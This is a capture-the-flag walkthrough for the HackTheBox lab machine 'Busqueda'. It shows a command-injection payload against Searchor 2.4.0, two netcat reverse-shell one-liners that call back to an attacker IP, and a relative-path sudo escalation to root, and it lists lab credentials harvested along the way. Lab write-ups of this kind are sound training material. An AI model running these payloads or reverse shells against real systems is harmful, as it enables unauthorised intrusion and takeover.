---
title: "HTB: Busqueda"
date: 2023-12-19
draft: false
os: "Linux"
difficulty: "Easy"
platform: "HTB"
aliases: ["/posts/htb/busqueda/"]
tags:
  - htb
  - easy
  - linux
  - command-injection
  - gitea
  - relative-path
  - docker
categories:
  - walkthrough
---

{{< box-info name="Busqueda" os="Linux" difficulty="Easy" ip="10.129.228.217" platform="HTB" >}}

---

## Recon

### Nmap

```bash
nmap -sC -sV -oN nmap/initial 10.129.228.217
```

{{< collapse title="Nmap output" >}}
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    Apache httpd 2.4.52
```
{{< /collapse >}}

Requests to the IP get redirected to `searcher.htb` -- add it to `/etc/hosts`.

---

## Enumeration

### Port 80 - Web App

Nuclei picks up Python as the backend tech. The web app is a search aggregator. At the bottom of the page we spot the tech stack: **Searchor 2.4.0**.

Quick research reveals that Searchor before version 2.4.2 is vulnerable to command injection via the `eval()` function.

---

## Foothold

### Searchor 2.4.0 - Command Injection

Testing for CI with a crafted POST request:

```bash
curl -X POST http://searcher.htb/search \
  -d "engine=AmazonWebServices&query='%2C__import__('os').system('id'))%20%23"
```

```
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```

We have RCE. Time for a reverse shell:

```python
',__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.73 9001 >/tmp/f')) # junky comment
```

Paste into the search field, catch with netcat -- we're in as `svc`.

---

## Privilege Escalation

### Git Credentials Discovery

The web app directory contains a `.git` folder. Inside `.git/config`:

```bash
[remote "origin"]
    url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

Credentials: `cody:jh1usoih2bkjaspwe92`

Add `gitea.searcher.htb` to `/etc/hosts` to access the Gitea instance. The password also works for SSH as `svc` (password reuse).

### Sudo Privileges

```bash
$ sudo -l
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

The script has three options: `docker-ps`, `docker-inspect`, and `full-checkup`.

### Docker Inspect - More Credentials

Using `docker-inspect` to dump the Gitea container config:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect \
  --format '{{json .}}' gitea
```

From the JSON output:

```json
"GITEA__database__PASSWD": "yuiu1hoiu4i5ho1uh"
```

This password works for the **Administrator** account on Gitea. Inside we find the `scripts` repository with the actual source code:

![Gitea scripts repository](/images/busqueda/gitea-scripts.png)

### Relative Path Exploitation

Reviewing `system-checkup.py` source from Gitea:

```python
elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
```

It calls `./full-checkup.sh` with a **relative path**. If we run the script from a directory where we control a `full-checkup.sh` file, we can execute arbitrary code as root:

```bash
# In home directory, create malicious script
cat > full-checkup.sh << 'EOF'
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.73 9002 >/tmp/f
EOF

chmod +x full-checkup.sh

# Trigger it
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Root shell received.

---

## Proof

![Root proof](/images/busqueda/proof.png)

### Credentials Collected

| User          | Password              | Service     |
|---------------|-----------------------|-------------|
| cody          | jh1usoih2bkjaspwe92   | Gitea       |
| svc           | jh1usoih2bkjaspwe92   | SSH         |
| gitea (db)    | yuiu1hoiu4i5ho1uh     | MySQL       |
| Administrator | yuiu1hoiu4i5ho1uh     | Gitea admin |

---

## Key Takeaways

{{< callout type="note" >}}
- Always check `.git` directories for hardcoded credentials in config files
- `docker inspect` can leak environment variables including database passwords
- Relative path vulnerabilities in sudo scripts are an easy win -- always check the source
- Password reuse across services is extremely common in real environments too
{{< /callout >}}
